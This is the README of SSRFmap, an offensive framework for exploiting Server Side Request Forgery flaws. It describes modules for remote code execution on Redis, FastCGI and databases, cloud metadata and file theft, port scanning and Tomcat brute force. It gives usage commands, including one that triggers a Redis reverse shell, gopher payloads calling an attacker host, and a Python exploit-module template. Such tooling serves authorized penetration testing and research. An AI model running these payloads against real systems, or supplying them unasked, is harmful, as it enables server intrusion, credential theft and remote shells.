# SSRFmap [![Python 3.4+](https://img.shields.io/badge/python-3.4+-blue.svg)](https://www.python.org/downloads/release/python-360/) [![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.raw.pm/)


SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. SSRFmap takes a Burp request file as input and a parameter to fuzz.

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Summary

* [Modules](#modules)
* [Install and Manual](#install-and-manual)
* [Examples](#examples)
* [SSRFmap - Tests](#ssrfmap-tests)
* [Contribute](#contribute)
  * [Contributors](#thanks-to-the-contributors)


## Modules

The following modules are already implemented and can be used with the `-m` argument.

| Name           | Description                                              |
| :------------- | :------------------------------------------------------- |
| `axfr`         | DNS zone transfers (AXFR)                                |
| `fastcgi`      | FastCGI RCE                                              |
| `redis`        | Redis RCE                                                |
| `github`       | Github Enterprise RCE < 2.8.7                            |
| `zabbix`       | Zabbix RCE                                               |
| `mysql`        | MySQL Command execution                                  |
| `postgres`     | Postgres Command execution                               |
| `docker`       | Docker Infoleaks via API                                 |
| `smtp`         | SMTP send mail                                           |
| `portscan`     | Scan top 8000 ports for the host                         |
| `networkscan`  | HTTP Ping sweep over the network                         |
| `readfiles`    | Read files such as `/etc/passwd`                         |
| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
| `socksproxy`   | SOCKS4 Proxy                                             |
| `smbhash`      | Force an SMB authentication via a UNC Path               |
| `tomcat`       | Bruteforce attack against Tomcat Manager                 |
| `custom`       | Send custom data to a listening service, e.g: netcat     |
| `memcache`     | Store data inside the memcache instance                  |


## Install and Manual

* From the Github repository.
  ```powershell
  $ git clone https://github.com/swisskyrepo/SSRFmap
  $ cd SSRFmap/
  $ pip3 install -r requirements.txt
  $ python3 ssrfmap.py

    usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
                      [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
                      [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]

    optional arguments:
      -h, --help          show this help message and exit
      -r REQFILE          SSRF Request file
      -p PARAM            SSRF Parameter to target
      -m MODULES          SSRF Modules to enable
      -l HANDLER          Start an handler for a reverse shell
      -v [VERBOSE]        Enable verbosity
      --lhost LHOST       LHOST reverse shell or IP to target in the network
      --lport LPORT       LPORT reverse shell or port to target in the network
      --uagent USERAGENT  User Agent to use
      --ssl [SSL]         Use HTTPS without verification
      --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
      --level [LEVEL]     Level of test to perform (1-5, default: 1)
  ```

* Docker
  ```powershell
  $ git clone https://github.com/swisskyrepo/SSRFmap
  $ docker build --no-cache -t ssrfmap .
  $ docker run -it ssrfmap ssrfmap.py [OPTIONS] 
  $ docker run -it -v $(pwd):/usr/src/app ssrfmap ssrfmap.py
  ```


## Examples

First you need a request with a parameter to fuzz, Burp requests works well with SSRFmap. 
They should look like the following. More examples are available in the **./examples** folder.

```powershell
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1

url=https%3A%2F%2Fwww.google.fr
```

Use the `-m` followed by module name (separated by a `,` if you want to launch several modules).

```powershell
# Launch a portscan on localhost and read default files
python ssrfmap.py -r examples/request.txt -p url -m readfiles,portscan
```

If you want to inject inside a header, a GET or a POST parameter, you only need to specify the parameter name

```powershell
python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /tmp/test
```

If you need to have a custom user-agent use the `--uagent`. Some targets will use HTTPS, you can enable it with `--ssl`.

```powershell
# Launch a portscan against an HTTPS endpoint using a custom user-agent
python ssrfmap.py -r examples/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
```

Some modules allow you to create a connect back, you have to specify `LHOST` and `LPORT`. Also SSRFmap can listen for the incoming reverse shell.

```powershell
# Triggering a reverse shell on a Redis
python ssrfmap.py -r examples/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l create a listener for reverse shell on the specified port
# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
```

When the target is protected by a WAF or some filters you can try a wide range of payloads and encoding with the parameter `--level`.

```powershell
# --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
```

## SSRFmap Tests

A quick way to test the framework can be done with `data/example.py` SSRF service.

* Local
  ```powershell
  FLASK_APP=examples/example.py flask run &
  python ssrfmap.py -r examples/request.txt -p url -m readfiles
  ```

* Docker
  ```ps1
  docker build --no-cache -t ssrfmap .

  # run example ssrf http service
  docker run -it -v $(pwd):/usr/src/app --name example ssrfmap examples/example.py

  # run example ssrf dns service
  docker exec -u root:root -it example python examples/ssrf_dns.py

  # run ssrfmap tool
  docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m readfiles
  ```

Launch the tests requests:

```ps1
docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request2.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request3.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request4.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request5.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /etc/issue
docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m axfr
docker exec -it example python ssrfmap.py -r examples/request3.txt -p url -m axfr --lhost 127.0.0.1 --lport 53 --ldomain example.lab
```


## Contribute

I :heart: pull requests :)
Feel free to add any feature listed below or a new service.
  - Redis PHP Exploitation 
  - HTTP module (Jenkins ?)
  ```powershell
  gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
  gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
  ```

The following code is a template if you wish to add a module interacting with a service.

```python
from core.utils import *
import logging

name          = "servicename in lowercase"
description   = "ServiceName RCE - What does it do"
author        = "Name or pseudo of the author"
documentation = ["http://link_to_a_research", "http://another_link"]

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Handle args for reverse shell
        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
        else:                  self.SERVER_HOST = args.lhost

        if args.lport == None: self.SERVER_PORT = input("Server Port:")
        else:                  self.SERVER_PORT = args.lport

        # Data for the service
        # Using a generator to create the host list
        # Edit the following ip if you need to target something else
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = "6379"
            data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
            payload = wrapper_gopher(data, ip , port)

            # Handle args for reverse shell
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # Send the payload
            r = requester.do_request(args.param, payload)
```

You can also contribute with a beer IRL or via Github Sponsor button.

### Thanks to the contributors

<p align="center">
<a href="https://github.com/swisskyrepo/SSRFmap/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=swisskyrepo/SSRFmap&max=36">
</a>
</p>


## Inspired by

- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [SSRF testing - cujanovic](https://github.com/cujanovic/SSRF-Testing)
